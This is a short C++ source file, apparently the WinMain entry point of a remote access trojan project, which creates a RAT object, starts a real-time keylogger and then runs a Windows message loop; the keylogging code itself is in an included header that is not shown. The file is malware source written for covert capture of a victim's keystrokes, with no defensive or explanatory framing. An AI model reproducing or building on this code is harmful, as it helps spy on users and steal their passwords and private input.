#include <iostream>
#include "rat/rat.h"

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    RAT rat;
    rat.startRealtimeKeylogger();

	MSG msg;
	BOOL bRet;
	while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
		if (bRet == -1) {
			// handle error
		}
		else {
			// Remove later to receive no input
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return 0;
}

